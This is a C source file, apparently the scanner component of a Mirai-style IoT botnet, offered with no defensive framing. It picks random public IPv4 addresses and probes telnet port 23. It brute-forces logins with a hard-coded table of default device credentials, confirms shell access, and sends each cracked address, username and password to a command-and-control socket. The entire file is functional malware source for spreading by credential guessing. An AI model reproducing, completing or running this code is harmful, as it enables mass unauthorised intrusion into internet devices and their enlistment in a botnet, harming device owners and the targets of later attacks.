#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>
#include <stdint.h>

#include "headers/scanner.h"
#include "headers/rand.h"

/* ── credential table ── */
typedef struct {
    const char *user;
    const char *pass;
} cred_t;

static const cred_t cred_table[] = {
    {"root",    ""},
    {"root",    "root"},
    {"root",    "admin"},
    {"admin",   "admin"},
    {"root",    "123456"},
    {"root",    "password"},
    {"admin",   "password"},
    {"root",    "1234"},
    {"admin",   "1234"},
    {"root",    "12345"},
    {"admin",   ""},
    {"user",    "user"},
    {"root",    "pass"},
    {"root",    "toor"},
    {"admin",   "admin1234"},
    {"root",    "default"},
    {"root",    "vizxv"},
    {"root",    "xc3511"},
    {"root",    "888888"},
    {"root",    "54321"},
    {"root",    "juantech"},
    {"root",    "anko"},
    {"root",    "realtek"},
    {"root",    "00000000"},
    {"admin",   "smcadmin"},
    {"admin",   "1111"},
    {"root",    "666666"},
    {"root",    "klv123"},
    {"root",    "klv1234"},
    {"root",    "Zte521"},
    {"root",    "hi3518"},
    {"root",    "jvbzd"},
    {"root",    "system"},
    {"root",    "ikwb"},
    {"root",    "dreambox"},
    {"root",    "user"},
    {"admin",   "7ujMko0admin"},
    {"root",    "7ujMko0admin"},
    {"root",    "zlxx."},
    {"root",    "cat1029"},
    {"root",    "GM8182"},
    {"root",    "oelinux123"},
    {"guest",   "guest"},
    {"admin",   "vizxv"},
    {"root",    "antslq"},
};
#define CRED_COUNT (sizeof(cred_table) / sizeof(cred_table[0]))

static volatile int scanner_running = 0;
static pthread_t scanner_thread;
static int report_sock = -1;

/* ── generate non-reserved random IPv4 ── */
static uint32_t gen_random_ip(void) {
    uint32_t ip;

    for (;;) {
        ip = rand_next();

        uint8_t o1 = (ip >> 24) & 0xFF;
        uint8_t o2 = (ip >> 16) & 0xFF;

        /* skip reserved / private / bogon ranges */
        if (o1 == 0)   continue;           /* 0.0.0.0/8       */
        if (o1 == 10)  continue;           /* 10.0.0.0/8      */
        if (o1 == 100 && (o2 >= 64 && o2 <= 127)) continue; /* 100.64.0.0/10 */
        if (o1 == 127) continue;           /* 127.0.0.0/8     */
        if (o1 == 169 && o2 == 254) continue; /* 169.254.0.0/16 */
        if (o1 == 172 && (o2 >= 16 && o2 <= 31)) continue;  /* 172.16.0.0/12 */
        if (o1 == 192 && o2 == 168) continue;  /* 192.168.0.0/16 */
        if (o1 == 192 && o2 == 0 && ((ip >> 8) & 0xFF) == 2) continue; /* 192.0.2.0/24 */
        if (o1 >= 224) continue;           /* multicast + reserved */

        return ip;
    }
}

/* ── non-blocking TCP connect with timeout ── */
static int tcp_connect(uint32_t ip, uint16_t port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(ip);

    int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    if (ret == 0) {
        fcntl(sock, F_SETFL, flags);
        return sock;
    }
    if (errno != EINPROGRESS) {
        close(sock);
        return -1;
    }

    struct pollfd pfd = { .fd = sock, .events = POLLOUT };
    ret = poll(&pfd, 1, timeout_sec * 1000);
    if (ret <= 0) {
        close(sock);
        return -1;
    }

    int err = 0;
    socklen_t len = sizeof(err);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
    if (err != 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, flags);
    return sock;
}

/* ── read until prompt or timeout ── */
static int read_until(int sock, const char *match, int timeout_ms) {
    char buf[512];
    int total = 0;
    time_t start = time(NULL);

    while (time(NULL) - start < (timeout_ms / 1000 + 1)) {
        struct pollfd pfd = { .fd = sock, .events = POLLIN };
        int ret = poll(&pfd, 1, timeout_ms);
        if (ret <= 0) break;

        int n = recv(sock, buf + total, sizeof(buf) - total - 1, 0);
        if (n <= 0) break;
        total += n;
        buf[total] = '\0';

        if (match && strstr(buf, match))
            return 1;

        /* common login prompts */
        if (strstr(buf, "ogin:") || strstr(buf, "ogin :") ||
            strstr(buf, "sername:") || strstr(buf, "ser :"))
            return 1;
    }
    return 0;
}

static int read_until_pass(int sock, int timeout_ms) {
    char buf[512];
    int total = 0;
    time_t start = time(NULL);

    while (time(NULL) - start < (timeout_ms / 1000 + 1)) {
        struct pollfd pfd = { .fd = sock, .events = POLLIN };
        int ret = poll(&pfd, 1, timeout_ms);
        if (ret <= 0) break;

        int n = recv(sock, buf + total, sizeof(buf) - total - 1, 0);
        if (n <= 0) break;
        total += n;
        buf[total] = '\0';

        if (strstr(buf, "assword:") || strstr(buf, "assword :"))
            return 1;
    }
    return 0;
}

/* ── check if login was successful ── */
static int check_shell(int sock) {
    /* send a harmless command and check output */
    const char *cmd = "echo pongcheck\r\n";
    send(sock, cmd, strlen(cmd), MSG_NOSIGNAL);

    char buf[256] = {0};
    struct pollfd pfd = { .fd = sock, .events = POLLIN };
    int ret = poll(&pfd, 1, 5000);
    if (ret <= 0) return 0;

    int n = recv(sock, buf, sizeof(buf) - 1, 0);
    if (n <= 0) return 0;
    buf[n] = '\0';

    /* if we see our echo, a shell prompt (#/$), or no "incorrect" message */
    if (strstr(buf, "pongcheck") ||
        strstr(buf, "#") ||
        strstr(buf, "$") ||
        strstr(buf, "BusyBox"))
        return 1;

    /* failed login indicators */
    if (strstr(buf, "ncorrect") || strstr(buf, "denied") ||
        strstr(buf, "nvalid") || strstr(buf, "ogin:") ||
        strstr(buf, "ailed"))
        return 0;

    return 0;
}

/* ── telnet brute-force a single host ── */
static int try_telnet_brute(uint32_t ip, char *out_user, char *out_pass, int max_user, int max_pass) {
    struct in_addr a;
    a.s_addr = htonl(ip);

    for (int c = 0; c < (int)CRED_COUNT && scanner_running; c++) {
        int sock = tcp_connect(ip, 23, SCANNER_TIMEOUT_SEC);
        if (sock < 0) return 0;

        /* wait for login prompt */
        if (!read_until(sock, NULL, 6000)) {
            close(sock);
            continue;
        }

        /* send username */
        char user_cmd[64];
        snprintf(user_cmd, sizeof(user_cmd), "%s\r\n", cred_table[c].user);
        send(sock, user_cmd, strlen(user_cmd), MSG_NOSIGNAL);

        /* wait for password prompt */
        if (!read_until_pass(sock, 4000)) {
            close(sock);
            continue;
        }

        /* send password */
        char pass_cmd[64];
        snprintf(pass_cmd, sizeof(pass_cmd), "%s\r\n", cred_table[c].pass);
        send(sock, pass_cmd, strlen(pass_cmd), MSG_NOSIGNAL);

        usleep(800000);

        /* check if we got shell */
        if (check_shell(sock)) {
            strncpy(out_user, cred_table[c].user, max_user - 1);
            strncpy(out_pass, cred_table[c].pass, max_pass - 1);
            close(sock);
            return 1;
        }

        close(sock);
        usleep(200000);
    }

    return 0;
}

/* ── report found credential to CNC ── */
static void report_to_cnc(uint32_t ip, uint16_t port, const char *user, const char *pass) {
    if (report_sock < 0) return;

    struct in_addr a;
    a.s_addr = htonl(ip);
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &a, ip_str, sizeof(ip_str));

    char report[256];
    snprintf(report, sizeof(report), "report %s:%d %s %s\n", ip_str, port, user, pass);
    send(report_sock, report, strlen(report), MSG_NOSIGNAL);
}

/* ── scanner main loop ── */
static void *scanner_loop(void *arg) {
    (void)arg;

    while (scanner_running) {
        uint32_t target_ip = gen_random_ip();

        /* fast port check - telnet (23) */
        int sock = tcp_connect(target_ip, 23, 3);
        if (sock < 0) {
            continue;
        }
        close(sock);

        /* port 23 open, try brute force */
        char found_user[64] = {0};
        char found_pass[64] = {0};

        if (try_telnet_brute(target_ip, found_user, found_pass, sizeof(found_user), sizeof(found_pass))) {
            report_to_cnc(target_ip, 23, found_user, found_pass);
        }

        /* small delay to avoid flooding */
        usleep(50000 + (rand_next() % 100000));
    }

    return NULL;
}

/* ── public interface ── */
void scanner_start(int cnc_sock) {
    if (scanner_running) return;
    scanner_running = 1;
    report_sock = cnc_sock;

    if (pthread_create(&scanner_thread, NULL, scanner_loop, NULL) != 0) {
        scanner_running = 0;
    }
    pthread_detach(scanner_thread);
}

void scanner_stop(void) {
    scanner_running = 0;
    report_sock = -1;
}

int scanner_is_running(void) {
    return scanner_running;
}
